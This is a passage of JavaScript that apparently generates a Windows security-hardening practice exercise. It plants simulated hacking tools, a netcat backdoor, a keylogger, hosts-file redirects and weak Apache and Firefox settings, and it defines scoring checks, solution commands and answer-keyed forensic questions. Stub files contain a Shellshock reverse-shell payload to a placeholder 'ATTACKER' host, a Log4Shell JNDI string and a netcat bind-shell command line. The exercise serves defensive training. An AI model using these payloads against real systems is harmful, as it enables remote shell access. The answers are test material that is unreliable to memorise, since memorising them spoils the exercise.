      { id: 'WiresharkFoundation.Wireshark', name: 'Wireshark 4.0.6 x64', short: 'Wireshark', publisher: 'The Wireshark developer community', version: '4.0.6', dir: '/Program Files/Wireshark', exe: 'Wireshark.exe', desktop: true },
      { id: 'Anysphere.Cursor', name: 'Cursor (User)', short: 'Cursor', publisher: 'Anysphere', version: '0.42.3', dir: '/Users/student/AppData/Local/Programs/cursor', exe: 'Cursor.exe', desktop: true },
      { id: 'Insecure.Nmap', name: 'Nmap 7.95', short: 'Nmap', publisher: 'Nmap Project', version: '7.95', dir: '/Program Files (x86)/Nmap', exe: 'nmap.exe' },
      { id: 'Jellyfin.JellyfinMediaPlayer', name: 'Jellyfin Media Player', short: 'Jellyfin Media Player', publisher: 'Jellyfin Project', version: '1.11.1', dir: '/Program Files/Jellyfin/Jellyfin Media Player', mark: '/Program Files/Jellyfin', exe: 'JellyfinMediaPlayer.exe' },
      { id: 'PortSwigger.BurpSuite.Community', name: 'Burp Suite Community Edition', short: 'Burp Suite Community Edition', publisher: 'PortSwigger Web Security', version: '2025.2.4', dir: '/Program Files/BurpSuiteCommunity', exe: 'BurpSuiteCommunity.exe', desktop: true, markLnk: true },
      { id: 'Python.Python.3.13', name: 'Python 3.13 (64-bit)', short: 'Python3', publisher: 'Python Software Foundation', version: '3.13.2', dir: '/Users/student/AppData/Local/Programs/Python/Python313', exe: 'python.exe', desktop: true, markLnk: true },
      { id: 'PeterNiederwieser.uTorrent', name: 'µTorrent', short: 'uTorrent', publisher: 'BitTorrent Inc.', version: '3.6.0.46884', dir: '/Users/student/AppData/Roaming/uTorrent', exe: 'uTorrent.exe', desktop: true },
      { id: 'angryziber.AngryIPScanner', name: 'Angry IP Scanner', short: 'Angry IP Scanner', publisher: 'Angry IP Scanner', version: '3.9.1', dir: '/Program Files/Angry IP Scanner', exe: 'ipscan.exe' },
      { id: 'Piriform.CCleaner', name: 'CCleaner', short: 'CCleaner', publisher: 'Piriform', version: '6.12', dir: '/Program Files/CCleaner', exe: 'CCleaner64.exe', desktop: true },
      { id: 'Valve.Steam', name: 'Steam', short: 'Steam', publisher: 'Valve Corporation', version: '2.10.91.91', dir: '/Program Files (x86)/Steam', exe: 'steam.exe', desktop: true },
    ].filter((p) => !(ctx.wireshark && p.short === 'Wireshark'));
    const picks = ctx.want?.software ? all.filter((p) => ctx.want.software.includes(p.short)) : ctx.shuffle(all).slice(0, ctx.int(1, 3));
    for (const p of picks) {
      const mark = p.markLnk ? `/Users/Public/Desktop/${p.name}.lnk` : p.mark || p.dir;
      ctx.apply((sys) => { addProgram(sys, p); if (p.short === 'Nmap') addProgram(sys, { id: 'Insecure.Npcap', name: 'Npcap', publisher: 'Nmap Project', version: '1.79', dir: '/Program Files/Npcap', exe: 'NPFInstall.exe', size: 4 }); });
      ctx.vuln({ id: `sw-${lc(p.short).replace(/\W+/g, '')}`, title: `Removed ${p.short}`, check: (s) => !program(s, p.id) || !s.vfs.exists(mark) });
      ctx.solve(1, `winget uninstall --id ${p.id} --silent`);
    }
  } },
  { id: 'tooldir', cat: SOFT, pts: 3, plan(ctx) {
    const t = ctx.pick([
      { dir: 'mimikatz_trunk', files: ['x64/mimikatz.exe', 'x64/mimidrv.sys', 'README.md'], short: 'mimikatz' },
      { dir: 'nc111nt', files: ['nc.exe', 'nc64.exe', 'readme.txt'], short: 'netcat' },
      { dir: 'cain', files: ['Cain.exe', 'Abel64.exe', 'Wordlists/Wordlist.txt'], short: 'Cain & Abel' },
      { dir: 'john-1.9.0-jumbo-1-win64', files: ['run/john.exe', 'run/password.lst', 'doc/README'], short: 'John the Ripper' },
    ]);
    const owner = ctx.pick(ctx.unauthorized.length ? ctx.unauthorized : ctx.users.map((u) => u.name));
    const base = `/Users/${owner}/Downloads/${t.dir}`;
    ctx.apply((sys) => { for (const f of t.files) putFile(sys, `${base}/${f}`, /\.(exe|sys)$/.test(f) ? BIN(f) : 'readme\n', { size: /\.exe$/.test(f) ? 900000 : 4000, days: 12 }); });
    ctx.vuln({ id: 'tooldir', title: `Removed ${t.short}`, check: (s) => !s.vfs.exists(base) });
    ctx.solve(1, `Remove-Item -Path ${q(S.toWin(base))} -Recurse -Force`);
  } },

  // ====================================================================== Prohibited Files
  { id: 'exploit', cat: FILES, pts: 3, plan(ctx) {
    const EXPLOITS = [['shellshock-exploit.py', 'shellshock', '#!/usr/bin/env python3\n# CVE-2014-6271 proof of concept\nimport requests\npayload = "() { :; }; /bin/bash -c \'nc -e /bin/sh ATTACKER 4444\'"\n'], ['eternalblue_exploit.py', 'EternalBlue exploit', '# MS17-010 exploit (simulated file)\nimport socket, struct\n'], ['log4shell-poc.py', 'Log4Shell exploit', '# CVE-2021-44228 PoC (simulated file)\npayload = "${jndi:ldap://attacker/a}"\n'], ['dirtypipe.c', 'Dirty Pipe exploit', '/* CVE-2022-0847 (simulated file) */\n#include <stdio.h>\n']];
    const x = ctx.want?.exploit != null ? EXPLOITS[ctx.want.exploit] : ctx.pick(EXPLOITS);
    const owner = ctx.pick(ctx.users).name;
    const f = `/Users/${owner}/Downloads/${x[0]}`;
    ctx.apply((sys) => putFile(sys, f, x[2], { days: 5 }));
    ctx.vuln({ id: 'exploit', title: `Removed ${x[1]} script`, check: (s) => !s.vfs.exists(f) });
    ctx.solve(1, `Remove-Item -Path ${q(S.toWin(f))}`);
  } },
  { id: 'media', cat: FILES, pts: 3, plan(ctx) {
    const owner = ctx.pick(ctx.users).name;
    const ext = ctx.pick(['mp3', 'mp4', 'flac']);
    const files = ctx.shuffle(['summer_mix', 'roadtrip', 'top_hits_2026', 'concert_live', 'study_beats', 'lofi_set']).slice(0, ctx.int(2, 3)).map((n) => `/Users/${owner}/${ext === 'mp4' ? 'Videos' : 'Music'}/${n}.${ext}`);
    ctx.apply((sys) => { for (const f of files) putFile(sys, f, `(binary ${ext} data)`, { size: 4200000 + ctx.int(0, 900000), days: 20 }); });
    ctx.vuln({ id: 'media', title: `Removed prohibited ${ext.toUpperCase()} files`, check: (s) => files.every((f) => !s.vfs.exists(f)) });
    ctx.solve(1, `Remove-Item -Path ${files.map((f) => q(S.toWin(f))).join(',')}`);
  } },
  { id: 'pwfile', cat: FILES, pts: 3, plan(ctx) {
    const owner = ctx.pick(ctx.users).name;
    const f = `/Users/${owner}/Documents/${ctx.pick(['passwords.txt', 'logins.txt', 'accounts.csv'])}`;
    ctx.apply((sys) => putFile(sys, f, `site,username,password\nbank,${owner},${ctx.strongPw()}\nemail,${owner}@example.org,${ctx.strongPw()}\n`, { days: 40 }));
    ctx.vuln({ id: 'pwfile', title: 'Removed plaintext password file', check: (s) => !s.vfs.exists(f) });
    ctx.solve(1, `Remove-Item -Path ${q(S.toWin(f))}`);
  } },

  // ====================================================================== Malware
  { id: 'backdoor', cat: MAL, pts: 5, plan(ctx) {
    const port = ctx.pick(PORTS);
    const name = ctx.pick(['WinUpdateHelper', 'SystemTelemetry', 'AdobeSync', 'DriverAssist', 'OneDriveSyncSvc']);
    const exe = `/ProgramData/${name}/${lc(name)}.exe`;
    ctx.backdoor = { port, name, exe };
    const proc = { user: 'SYSTEM', cmd: `"${S.toWin(exe)}" -l -p ${port} -e cmd.exe`, comm: `${lc(name)}.exe`, stat: 'Running', listen: [{ proto: 'tcp', addr: '0.0.0.0', port }] };
    ctx.apply((sys) => {
      putFile(sys, exe, BIN('netcat'), { size: 45272, days: 6 });
      sys.win.tasks.push({ path: '\\', name, author: `${sys.hostname}\\${ctx.unauthorized[0] || 'Administrator'}`, action: `${S.toWin(exe)} -l -p ${port} -e cmd.exe`, trigger: 'At system startup', enabled: true, desc: '' });
      sys.win.respawn.push({ id: `bd-${name}`, task: name, exe, proc });
      sys.spawn({ ...proc, respawnId: `bd-${name}` });
    });
    ctx.vuln({ id: 'backdoor', title: `Removed netcat backdoor (${name})`, check: (s) => !S.portListening(s, port) && !s.vfs.exists(exe) && !S.getTask(s, name) });
    ctx.solve(1, `Unregister-ScheduledTask -TaskName ${name} -Confirm:$false`);
    ctx.solve(1, `Stop-Process -Name ${lc(name)} -Force`);
    ctx.solve(1, `Remove-Item -Path ${q(S.toWin(exe.slice(0, exe.lastIndexOf('/'))))} -Recurse -Force`);
  } },
  { id: 'runkey', cat: MAL, pts: 4, plan(ctx) {
    const v = ctx.pick(['WindowsDefenderUpdate', 'ChromeUpdater', 'SecurityHelper', 'AudioDriverSvc']);
    const exe = `/Users/Public/Libraries/${lc(v)}.exe`;
    const proc = { user: 'student', cmd: `"${S.toWin(exe)}" /silent`, comm: `${lc(v)}.exe`, stat: 'Running' };
    ctx.apply((sys) => { putFile(sys, exe, BIN('keylogger'), { size: 118784, days: 4 }); setReg(sys, S.KEYS.run, v, `"${S.toWin(exe)}" /silent`, 'REG_SZ'); sys.win.respawn.push({ id: `rk-${v}`, runKey: v, exe, proc }); sys.spawn({ ...proc, respawnId: `rk-${v}` }); });
    ctx.vuln({ id: 'runkey', title: 'Removed keylogger that started at logon', check: (s) => S.regGet(s, S.KEYS.run, v) == null && !s.vfs.exists(exe) && !s.processes.some((p) => p.respawnId === `rk-${v}`) });
    ctx.solve(1, `Remove-ItemProperty -Path ${q(regPS(S.KEYS.run))} -Name ${v}`);
    ctx.solve(1, `Stop-Process -Name ${lc(v)} -Force`);
    ctx.solve(1, `Remove-Item -Path ${q(S.toWin(exe))} -Force`);
  } },
  { id: 'hosts', cat: MAL, pts: 3, plan(ctx) {
    const hosts = '/Windows/System32/drivers/etc/hosts';
    const domains = ctx.shuffle(['www.google.com', 'update.microsoft.com', 'www.bankofamerica.com', 'windowsupdate.microsoft.com', 'go.microsoft.com']).slice(0, 2);
    ctx.apply((sys) => { const t = sys.vfs.readFile(hosts); sys.vfs.writeFile(hosts, t + domains.map((d) => `203.0.113.${ctx.int(10, 200)}\t${d}`).join('\n') + '\n'); });
    ctx.vuln({ id: 'hosts', title: 'Hosts file no longer redirects trusted sites', check: (s) => !s.vfs.readFile(hosts).split('\n').some((l) => !l.trim().startsWith('#') && domains.some((d) => l.includes(d))) });
    ctx.solve(1, `Set-Content -Path C:\\Windows\\System32\\drivers\\etc\\hosts -Value '# localhost name resolution is handled within DNS itself.'`);
  } },

  // ====================================================================== Apache web server (critical service when dealt)
  { id: 'apache-sig', cat: APPSEC, pts: 3, plan(ctx) {
    needApache(ctx);
    ctx.vuln({ id: 'apache-sig', title: 'Disable Apache server signature', check: (s) => /^[ \t]*ServerSignature[ \t]+Off\b/im.test(httpd(s)) && !/^[ \t]*ServerSignature[ \t]+(On|EMail)\b/im.test(httpd(s)) });
    ctx.solve(1, `(Get-Content C:\\Apache24\\conf\\httpd.conf) -replace '^ServerSignature On', 'ServerSignature Off' | Set-Content C:\\Apache24\\conf\\httpd.conf`);
  } },
  { id: 'apache-tokens', cat: APPSEC, pts: 3, plan(ctx) {
    needApache(ctx);
    ctx.vuln({ id: 'apache-tokens', title: 'Apache only reports its product name (ServerTokens Prod)', check: (s) => /^[ \t]*ServerTokens[ \t]+(Prod|ProductOnly)\b/im.test(httpd(s)) });
    ctx.solve(1, `(Get-Content C:\\Apache24\\conf\\httpd.conf) -replace '^ServerTokens Full', 'ServerTokens Prod' | Set-Content C:\\Apache24\\conf\\httpd.conf`);
  } },
  { id: 'apache-indexes', cat: APPSEC, pts: 3, plan(ctx) {
    needApache(ctx);
    ctx.vuln({ id: 'apache-indexes', title: 'Apache directory listing is disabled', check: (s) => !/^[ \t]*Options[^\n#]*(?<!-)\bIndexes\b/im.test(httpd(s)) });
    ctx.solve(1, `(Get-Content C:\\Apache24\\conf\\httpd.conf) -replace 'Options Indexes FollowSymLinks', 'Options FollowSymLinks' | Set-Content C:\\Apache24\\conf\\httpd.conf`);
  } },

  // ====================================================================== Application Security (Chrome)
  { id: 'brpopups', cat: APPSEC, pts: 3, plan(ctx) {
    ctx.apply((sys) => BP.setFirefox(sys, 'student', { 'dom.disable_open_during_load': false }));
    ctx.vuln({ id: 'brpopups', title: 'Firefox blocks pop-up windows', check: (s) => BP.firefoxPopupsBlocked(s, 'student') });
    ctx.solve(1, `(Get-Content '${FFPREFS}') -replace 'user_pref\\("dom.disable_open_during_load", false\\);', 'user_pref("dom.disable_open_during_load", true);' | Set-Content '${FFPREFS}'`);
  } },
  { id: 'brsafe', cat: APPSEC, pts: 3, plan(ctx) {
    ctx.apply((sys) => BP.setFirefox(sys, 'student', { 'browser.safebrowsing.malware.enabled': false, 'browser.safebrowsing.phishing.enabled': false }));
    ctx.vuln({ id: 'brsafe', title: 'Firefox blocks dangerous and deceptive content', check: (s) => BP.firefoxDangerousContentBlocked(s, 'student') });
    ctx.solve(1, `(Get-Content '${FFPREFS}') -replace '(safebrowsing\\.(malware|phishing)\\.enabled", )false', '$1true' | Set-Content '${FFPREFS}'`);
  } },

  // ====================================================================== Forensics
  { id: 'fq-b64', forensic: true, plan(ctx) {
    const word = `${ctx.pick(WORDS)}-${ctx.int(10, 99)}`;
    const owner = ctx.pick(ctx.users).name;
    const f = `/Users/${owner}/Documents/message.txt`;
    ctx.apply((sys) => putFile(sys, f, b64(`The secret codeword for the vault is ${word}. Do not share it.`) + '\n', { days: 9 }));
    ctx.forensic(`The file ${S.toWin(f)} contains a Base64-encoded message.\n\nWhat is the secret codeword?\n\n(Example: TOASTER-12)`, word);
  } },
  { id: 'fq-sid', forensic: true, plan(ctx) {
    const u = ctx.pick(ctx.users);
    ctx.forensic(`What is the security identifier (SID) of the user account ${u.name}?\n\n(Example: S-1-5-21-1111111111-2222222222-3333333333-1001)`, `${S.MACHINE_SID}-${u.rid}`);
  } },
  { id: 'fq-hash', forensic: true, plan(ctx) {
    const owner = ctx.pick(ctx.users).name;
    const f = `/Users/${owner}/Desktop/${ctx.pick(['budget-2026.txt', 'roster.txt', 'meeting-notes.txt'])}`;
    const body = `Quarterly figures for ${ctx.org[0]}\nTotal: ${ctx.int(1000, 99999)}\n`;
    ctx.apply((sys) => putFile(sys, f, body, { days: 3 }));
    ctx.forensic(`What is the SHA256 hash of the file ${S.toWin(f)}?`, sha256hex(body).toUpperCase());
  } },
  { id: 'fq-port', forensic: true, requires: 'backdoor', plan(ctx) {
    ctx.forensic('A backdoor on this computer is listening for network connections.\n\nWhat TCP port is it listening on?\n\n(Example: 8080)', String(ctx.backdoor.port));
  } },
  { id: 'fq-share', forensic: true, requires: 'hiddenshare', plan(ctx) {
    ctx.forensic('An unauthorized hidden file share was created on this computer.\n\nWhat folder does it share?\n\n(Example: C:\\Windows\\Temp)', ctx.hiddenShare.path);
  } },
  { id: 'fq-task', forensic: true, requires: 'backdoor', plan(ctx) {
    ctx.forensic('A scheduled task starts a backdoor every time the computer boots.\n\nWhat is the name of that scheduled task?', ctx.backdoor.name);
  } },
  { id: 'fq-pcap', forensic: true, requires: 'wireshark', plan(ctx) {
    const net = `192.168.${ctx.int(100, 250)}`;
    const attacker = `${net}.${ctx.int(120, 199)}`; const victim = `${net}.${ctx.int(10, 60)}`; const gw = `${net}.1`;
    const pk = []; let t = 0; const add = (src, dst, proto, info, len = 60) => { t += 0.0001 + ctx.int(1, 900) / 100000; pk.push([t.toFixed(6), src, dst, proto, len, info]); };
    add(gw, '255.255.255.255', 'DHCP', 'DHCP ACK - Transaction ID 0x3f1a9c2e', 342);
    add(victim, gw, 'DNS', 'Standard query 0x1c2d A update.example.com', 74);
    add(gw, victim, 'DNS', 'Standard query response 0x1c2d A update.example.com A 93.184.215.14', 90);
    const ports = ctx.shuffle([21, 22, 23, 25, 53, 80, 110, 135, 139, 143, 443, 445, 3306, 3389, 5985, 8080]).slice(0, 9);
    for (const p of ports) add(attacker, victim, 'TCP', `${ctx.int(40000, 60000)} → ${p} [SYN] Seq=0 Win=1024 Len=0 MSS=1460`, 58);
    for (const p of ports.filter((x) => [22, 80, 135, 445, 3389, 5985].includes(x))) add(victim, attacker, 'TCP', `${p} → ${ctx.int(40000, 60000)} [SYN, ACK] Seq=0 Ack=1 Win=64240 Len=0 MSS=1460`, 58);
    add(attacker, victim, 'HTTP', 'GET /cgi-bin/status HTTP/1.1  User-Agent: () { :; }; /bin/bash -c "id"', 236);
    add(victim, attacker, 'HTTP', 'HTTP/1.1 404 Not Found  (text/html)', 512);
    add(victim, gw, 'ARP', `Who has ${gw}? Tell ${victim}`, 42);
    ctx.pcap = { attacker, victim, packets: pk };
    ctx.apply((sys) => {
      const f = '/Users/student/Documents/Captures/attack.pcap';
      putFile(sys, f, 'PCAPSIM1:' + b64(JSON.stringify({ linktype: 'Ethernet', packets: pk })), { size: 4096 + pk.length * 96, days: 2 });
      putFile(sys, '/Users/student/Desktop/attack.pcap.lnk', `[shortcut] ${S.toWin(f)}`, { days: 2 });
    });
    ctx.forensic('A capture of suspicious network traffic was saved as attack.pcap (there is a shortcut on the Desktop).\n\nOpen it with Wireshark. What is the IP address of the host that scanned and attacked this network?\n\n(Example: 10.0.0.25)', attacker);
  } },
  { id: 'fq-otp', forensic: true, plan(ctx) {
    const msg = ctx.pick(['The quiet river remembers everything', 'Every lock has a patient key', 'Midnight trains never wait for anyone', 'Small sparks can start great fires', 'The map is not the territory', 'Nobody reads the fine print anymore']);
    const key = Array.from(msg, () => ctx.int(0, 255));
    const hex = (a) => a.map((b) => b.toString(16).padStart(2, '0')).join('');
    const ct = Array.from(msg, (c, i) => c.charCodeAt(0) ^ key[i]);
    ctx.forensic(`A message was encrypted with a one-time pad. Decrypt it.\n\nOne-time pad (key, hex):\n${hex(key)}\n\nCiphertext (hex):\n${hex(ct)}\n\nUse a one-time pad / XOR decryption tool, for example the practice tool at https://otp-tools.example/ in Firefox (or CyberChef's "From Hex" + "XOR").\n\nWhat is the decrypted message?`, msg);
  } },
  { id: 'fq-hex', forensic: true, plan(ctx) {
    const msg = ctx.pick(['Keep calm and patch everything', 'Security is a team sport', 'Least privilege wins the day', 'Trust but verify every login', 'Practice makes perfect scores']);
    const hx = Array.from(msg, (c) => c.charCodeAt(0).toString(16).padStart(2, '0'));
    const lines = []; for (let i = 0; i < hx.length; i += 20) lines.push(hx.slice(i, i + 20).join(' '));
    ctx.forensic(`Convert the following message:\n\n${lines.join('\n')}\n\nHint: Use a Hex to ASCII text converter (for example https://hex-tools.example/ in Firefox).\n\n( EXAMPLE: Decode to find the answer! )`, msg);
  } },
  { id: 'fq-cve', forensic: true, plan(ctx) {
    const c = ctx.pick([['CVE-2021-36934', 'The Windows Elevation of Privilege vulnerability identified in CVE-2021-36934 lets non-administrator users read the Security Account Manager (SAM) database file, which stores hashed user and administrator passwords. An attacker could then install programs, create accounts and delete data.'], ['CVE-2021-34527', 'The Windows Print Spooler remote code execution vulnerability identified in CVE-2021-34527 ("PrintNightmare") lets an attacker abuse the Print Spooler service, which performs privileged file operations improperly. An attacker could then install programs, create accounts and delete data.']]);
    ctx.forensic(`${c[1]}\n\nWhat privileges would an attacker have in the CVE described above? Reference: Microsoft Security Response Center (practice copy: https://msrc.example/update-guide/vulnerability/${c[0]}).\n\n( EXAMPLE: Users )`, 'SYSTEM');
  } },
  { id: 'fq-note', forensic: true, plan(ctx) {
    const owner = ctx.pick(ctx.users).name;
    const pw = `${ctx.pick(WORDS)[0]}${ctx.pick(WORDS).slice(1).toLowerCase()}-${ctx.int(1000, 9999)}`;
    const f = `/Users/${owner}/${ctx.pick(['Documents', 'Pictures', 'Downloads'])}/${ctx.pick(['todo.txt', 'misc.txt', 'reminders.txt'])}`;
    ctx.apply((sys) => putFile(sys, f, `- pick up dry cleaning\n- the VPN password is ${pw}\n- call mom\n`, { days: 11 }));
    ctx.forensic(`A user wrote down the company VPN password in a text file somewhere under C:\\Users.\n\nWhat is the VPN password?`, pw);
  } },
];
void userDir;

// ------------------------------------------------------------------ Apache 2.4 (Apache Lounge build in C:\Apache24)
const HTTPD = '/Apache24/conf/httpd.conf';
const httpd = (sys) => (sys.vfs.isFile(HTTPD) ? sys.vfs.readFile(HTTPD) : '');
export function httpdConf() {
  const lines = ['#', '# This is the main Apache HTTP server configuration file.  It contains the', '# configuration directives that give the server its instructions.', '# See <URL:http://httpd.apache.org/docs/2.4/> for detailed information.', '#', '# Do NOT simply read the instructions in here without understanding', '# what they do.  They\'re here only as hints or reminders.  If you are unsure', '# consult the online docs. You have been warned.', '#',
    'Define SRVROOT "c:/Apache24"', '', 'ServerRoot "${SRVROOT}"', '', '#', '# Listen: Allows you to bind Apache to specific IP addresses and/or', '# ports, instead of the default.', '#', 'Listen 80', '', '#', '# Dynamic Shared Object (DSO) Support', '#',
    'LoadModule actions_module modules/mod_actions.so', 'LoadModule alias_module modules/mod_alias.so', 'LoadModule allowmethods_module modules/mod_allowmethods.so', 'LoadModule asis_module modules/mod_asis.so', 'LoadModule auth_basic_module modules/mod_auth_basic.so', 'LoadModule authn_core_module modules/mod_authn_core.so', 'LoadModule authn_file_module modules/mod_authn_file.so', 'LoadModule authz_core_module modules/mod_authz_core.so', 'LoadModule authz_groupfile_module modules/mod_authz_groupfile.so', 'LoadModule authz_host_module modules/mod_authz_host.so', 'LoadModule authz_user_module modules/mod_authz_user.so', 'LoadModule autoindex_module modules/mod_autoindex.so', 'LoadModule cgi_module modules/mod_cgi.so', 'LoadModule dir_module modules/mod_dir.so', 'LoadModule env_module modules/mod_env.so', 'LoadModule include_module modules/mod_include.so', 'LoadModule isapi_module modules/mod_isapi.so', 'LoadModule log_config_module modules/mod_log_config.so', 'LoadModule mime_module modules/mod_mime.so', 'LoadModule negotiation_module modules/mod_negotiation.so', 'LoadModule setenvif_module modules/mod_setenvif.so',
    '', '<IfModule unixd_module>', 'User daemon', 'Group daemon', '</IfModule>', '', 'ServerAdmin admin@example.com', 'ServerName localhost:80', '',
    '#', '# ServerTokens', '# This directive configures what you return as the Server HTTP response', '# Header. The default is \'Full\' which sends information about the OS-Type', '# and compiled in modules.', '#', 'ServerSignature On', 'ServerTokens Full', '',
    '<Directory />', '    AllowOverride none', '    Require all denied', '</Directory>', '', 'DocumentRoot "${SRVROOT}/htdocs"', '<Directory "${SRVROOT}/htdocs">', '    Options Indexes FollowSymLinks', '    AllowOverride None', '    Require all granted', '</Directory>', '',
    '<IfModule dir_module>', '    DirectoryIndex index.html', '</IfModule>', '', '<Files ".ht*">', '    Require all denied', '</Files>', '', 'ErrorLog "logs/error.log"', 'LogLevel warn', '', '<IfModule log_config_module>', '    LogFormat "%h %l %u %t \\"%r\\" %>s %b" common', '    CustomLog "logs/access.log" common', '</IfModule>', '',
    '<IfModule mime_module>', '    TypesConfig conf/mime.types', '    AddType application/x-compress .Z', '    AddType application/x-gzip .gz .tgz', '</IfModule>', ''];
  return lines.join('\n');
}
function needApache(ctx) {
  if (ctx.apache) return;
  ctx.apache = true;
  ctx.readme.notes.push('This computer also hosts the company\'s small public website with the <b>Apache HTTP Server 2.4</b> (<code>C:\\Apache24</code>). The <b>Apache2.4</b> service is critical and must keep running. Harden its configuration.');
  ctx.apply((sys) => {
    putFile(sys, '/Apache24/bin/httpd.exe', BIN('httpd.exe'), { size: 33280, days: 60 });
    putFile(sys, '/Apache24/bin/ApacheMonitor.exe', BIN('ApacheMonitor.exe'), { size: 46080, days: 60 });
    putFile(sys, HTTPD, httpdConf(), { days: 60 });
    putFile(sys, '/Apache24/conf/mime.types', '# This file maps Internet media types to unique file extension(s).\ntext/html\t\t\t\t\thtml htm\n', { days: 60 });
    putFile(sys, '/Apache24/htdocs/index.html', '<html><body><h1>It works!</h1></body></html>\n', { days: 60 });
    putFile(sys, '/Apache24/logs/access.log', '', { days: 1 });
    addService(sys, { name: 'Apache2.4', display: 'Apache2.4', desc: 'Apache/2.4.58 (Win64)', startType: 'Automatic', status: 'Running', exe: 'httpd.exe', cmdline: '"C:\\Apache24\\bin\\httpd.exe" -k runservice', listen: [{ proto: 'tcp', addr: '0.0.0.0', port: 80 }] });
  });
}
